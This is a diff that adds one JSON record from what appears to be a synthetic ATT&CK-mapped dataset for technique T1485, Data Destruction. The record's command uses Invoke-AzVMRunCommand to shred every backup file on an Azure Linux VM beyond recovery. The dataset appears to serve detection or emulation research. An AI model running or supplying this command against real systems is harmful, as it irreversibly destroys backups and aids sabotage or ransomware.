@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Data' -Name 'LinVM-Backup' -CommandId 'RunShellScript' -ScriptString \"find /mnt/data/backups -type f -print0 | xargs -0 -I{} shred -n 3 -z -u '{}'\"",
+  "explanation": "On a Linux VM, securely overwrites and deletes every file in /mnt/data/backups using shred.",
+  "rationale_steps": [
+    "Locate all files in the targeted backup directory.",
+    "Use shred with multiple passes and zeroing to irreversibly destroy file contents and unlink them."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-f1cadb82",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
